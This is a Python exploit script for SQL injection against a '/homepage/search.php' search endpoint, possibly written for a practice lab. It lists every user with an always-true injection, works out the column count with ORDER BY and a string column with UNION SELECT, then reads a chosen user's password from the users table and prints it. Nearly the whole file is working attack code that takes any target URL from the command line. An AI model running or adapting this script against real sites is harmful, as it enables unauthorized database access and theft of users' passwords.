import requests
import sys
import urllib3
import html
import re

proxies = {'http':'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080/'} #debug

def exploit_sqli_column_number(url):
    path = '/homepage/search.php'
    for i in range(1,100):
        sqli_payload = r"?search=%27+or+1%3D1+order+by+" + str(i) +r"--+&search_for=user"
        r = requests.get(url+path+sqli_payload, verify=False, proxies = proxies)
        if ("Number user found:" not in r.text):
            return i-1
    return False

def exploit_sqli_string_field(url, col):
    path = '/homepage/search.php'
    for i in range(1,col + 1):
        string = "'abc'"
        payload_list = ['null'] * col
        payload_list[i-1] = string
        sql_payload = r"?search='UNION+SELECT+"+','.join(payload_list)+"--+&search_for=user"
        r = requests.get(url+path+sql_payload,verify=False, proxies= proxies)
        if string in r.text:
            return i
    return False


def exploit_sqli_list_user(url):
    path = '/homepage/search.php'
    payload = "?search='or '1'='1&search_for=user"
    r = requests.get(url+path+payload,verify=False, proxies= proxies)
    exploit = (r.text[r.text.find("<ul>") : r.text.find("</ul")]).split("<li>")
    print(*["   [-]"+str(html.unescape(i[i.find("'>") + 2 : i.find("</a></li><br><br>")])) if (i != exploit[0]) else "[+] %d users found:"%(len(exploit)-1) for i in exploit],sep = "\n")
def exploit_sqli(url,sqli_payload):
    uri = "/homepage/search.php?search="
    p = "&search_for=user"
    r = requests.get(url + uri + sqli_payload + p, verify = False, proxies= proxies)
    if ("Number user found:" in r.text):
        exploit = r.text[r.text.find('<a') : r.text.find("</a>")]     
        exploit = html.unescape(exploit[exploit.find("'>")+2:])
        print("-> Password: "+exploit)
        return True
    else:
        return False

def printhelp(name):
    print("Exploit user password program:")
    print("[-] Usage: %s <url>" %name)
    print("""[-] Example: %s "www.example.com" """ %name)

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        printhelp(sys.argv[0])
        sys.exit(-1)

    exploit_sqli_list_user(url)
#---------------------------------------------------------------------------------
    user = input("[+] Username to exploit:")
    sqli_payload = "' UNION select password from users where username = '%s"%user
#---------------------------------------------------------------------------------
    
    print("[+] Finding number of columsn...")
    col = exploit_sqli_column_number(url)
    if col:
        print("[+] The number of column is %d"%col)
        string_column = exploit_sqli_string_field(url,col)
        if string_column:
            print("[+] The column has a string data type is %d"%string_column)
        else:
            print("[+] Unable to find string column")
    else:
        print("[+] Unable to find number of clumns")

    if not exploit_sqli(url,sqli_payload):
        print("[+] User not exists")
        